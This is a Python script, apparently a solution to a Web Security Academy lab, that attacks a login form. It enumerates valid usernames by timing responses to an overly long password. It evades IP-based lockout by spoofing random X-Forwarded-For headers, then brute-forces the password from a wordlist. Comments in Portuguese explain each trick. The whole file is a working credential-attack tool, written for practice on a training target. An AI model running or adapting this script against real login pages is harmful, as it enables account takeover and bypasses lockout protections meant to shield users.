import requests,secrets

url = 'https://0a4400a203b3e8678047125b003f00e2.web-security-academy.net/login'

with open('wordlist_user.txt', 'r') as arquivo_user:
    list_user = arquivo_user.read().splitlines()

for i in range(len(list_user)):
    data = {
        "username": list_user[i],
        "password": "0123456789abcdefghijklmnopqrstuvwxyz!@#$%¨&*()zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"
        # A aplicação só verifica o password caso o username seja válido
        # Quanto maior for a senha aletória, maior será o tempo da requisição e mais perceptível será encontrar o username válido
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": str(secrets.randbits(20))
        # O cabeçalho X-Forwarded-For identifica o IP real do cliente. 
        # O sistema bloqueia o IP quando o sistema atinge 3 tentivas incorretas de login.
        # Inserindo IPs aleatórios a cada nova requisição o sistema não bloqueia as requisições.
    }
    response = requests.post(url, headers=headers, data=data)
    print(str(response.elapsed.total_seconds()) + " -> índice " + str(i))

# Analisar manualmente os tempos das requisições para enumerar os possíveis usernames válidos  
username = list_user[12]

# A partir da enumeração dos usernames testar as passwords
with open('wordlist_pass.txt', 'r') as arquivo_pass:
    list_pass = arquivo_pass.read().splitlines()

for i in range(len(list_pass)):
    data = {
        "username": username,
        "password": list_pass[i]
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Forwarded-For": str(secrets.randbits(20))
    }
    response = requests.post(url, headers=headers, data=data)
    
    if "Invalid username or password." in response.text:
        pass
    else:
        print(username + " -> " + list_pass[i])